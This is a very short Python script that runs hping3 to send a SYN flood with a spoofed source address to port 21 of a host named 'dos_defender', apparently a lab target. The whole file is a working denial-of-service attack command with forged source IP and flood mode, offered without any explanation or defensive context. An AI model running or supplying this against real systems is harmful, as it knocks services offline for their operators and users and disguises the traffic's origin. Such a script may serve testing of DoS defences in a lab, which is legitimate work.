import os

target_ip = "dos_defender"
os.system("hping3 -a 203.0.113.100 -c 10000 -d 120 -S -w 64 -p 21 --flood "+target_ip)
